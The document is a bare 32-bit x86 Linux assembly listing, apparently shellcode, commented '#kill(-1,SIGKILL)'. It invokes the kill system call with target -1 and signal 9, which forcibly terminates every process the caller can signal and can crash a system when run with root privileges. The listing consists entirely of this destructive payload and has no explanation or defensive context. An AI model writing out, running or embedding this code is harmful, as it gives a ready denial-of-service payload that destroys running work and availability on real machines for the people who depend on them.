#kill(-1,SIGKILL)

.global _start
_start:
	xor %eax,%eax
	mov $0x25,%al
	mov $-1,%ebx
	xor %ecx,%ecx
	mov $9,%cl
	int $0x80
